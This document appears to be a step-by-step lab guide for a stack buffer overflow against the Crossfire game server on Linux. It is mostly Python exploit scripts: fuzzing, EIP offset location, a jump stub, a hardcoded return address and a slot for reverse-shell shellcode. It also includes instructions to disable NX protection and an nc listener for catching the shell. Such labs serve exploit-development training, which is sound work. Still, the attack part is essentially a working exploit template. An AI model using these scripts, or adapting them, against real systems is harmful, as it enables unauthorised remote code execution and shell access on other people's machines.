# BOF for Linux

#### Linux Buffer Overflow Lab Setup

**1. Install Dependencies**

```bash
#!/bin/bash
sudo apt-get update -y
sudo apt-get install -y edb-debugger
sudo dpkg --add-architecture i386
echo "foreign-architecture i386" | sudo tee /etc/dpkg/dpkg.cfg.d/multiarch
sudo apt-get update
sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
sudo apt-get install multiarch-support
sudo apt-get install libxaw7 libxaw7-dev -y
sudo apt install checksec
wget www.offensive-security.com/crossfire.tar.gz
tar -zxf crossfire.tar.gz
sudo cp -r crossfire /usr/games/
checksec --file=/usr/games/crossfire/bin/crossfire
```

**2. Disable NX**

```bash
sudo nano /etc/default/grub
# Add this line:
# GRUB_CMDLINE_LINUX_DEFAULT="quiet noexec=off noexec32=off"
sudo update-grub
```

**3. Fuzzing (fuzzing.py)**

```python
import socket

host = "192.168.1.5"
port = 13327
overflow = 'A' * 4379
buffer = "\x11(setup sound " + overflow + "\x90\x00#"

s = socket.socket()
s.connect((host, port))
print(s.recv(1024))
s.send(buffer)
s.close()
```

**4. Controlling EIP (locate\_eip.py)**

```python
import socket

host = "192.168.1.5"
port = 13327
overflow = ""  # Put pattern obtained from msf-pattern_create here
buffer = "\x11(setup sound " + overflow + "\x90\x00#"

s = socket.socket()
s.connect((host, port))
print(s.recv(1024))
s.send(buffer)
s.close()
# Use msf-pattern_offset -l 4379 -q <value obtained from the response> to find the offset
```

**5. Locating Space for Shellcode (locate\_shellcode.py)**

```python
import socket

host = "192.168.1.5"
port = 13327

# Shellcode for a reverse shell
shell = b"\xda\xdb\xd9\x74\x24\xf4\xb8\xd0\xa3\x8b\x63\x5d"  # Replace with your shellcode

step1 = '\x83\xC0\x0C\xFF\xE0\x90\x90'
overflow = "A" * 4368 + '\x96\x45\x13\x08' + step1
buffer = "\x11(setup sound " + overflow + "\x90\x00#"

s = socket.socket()
s.connect((host, port))
print(s.recv(1024))
s.send(buffer)
s.close()
```

**6. Checking for Bad Characters (find\_bad\_characters.py)**

```python
import socket

host = "192.168.1.5"
port = 13327

# Shellcode for a reverse shell
shell = b"\xda\xdb\xd9\x74\x24\xf4\xb8\xd0\xa3\x8b\x63\x5d"  # Replace with your shellcode

step1 = '\x83\xC0\x0C\xFF\xE0\x90\x90'
bad = ""  # Add pattern obtained from creating bad characters here
overflow = "A" * 4368 + '\x96\x45\x13\x08' + step1
buffer = "\x11(setup sound " + overflow + "\x90\x00#"

s = socket.socket()
s.connect((host, port))
print(s.recv(1024))
s.send(buffer)
s.close()
```

**7. Find Return Address (exploit.py)**

```python
import socket

host = "192.168.1.5"
port = 13327

# Shellcode for a reverse shell
shell = b"\xda\xdb\xd9\x74\x24\xf4\xb8\xd0\xa3\x8b\x63\x5d"  # Replace with your shellcode

step1 = '\x83\xC0\x0C\xFF\xE0\x90\x90'
overflow = '\x90' * 16 + shell + '\x90' * (4368 - 16 - len(shell)) + '\x96\x45\x13\x08' + step1
buffer = "\x11(setup sound " + overflow + "\x90\x00#"

s = socket.socket()
s.connect((host, port))
print(s.recv(1024))
s.send(buffer)
s.close()
# Use the command 'sudo nc -nlvp 443' to listen for incoming shell connections
```
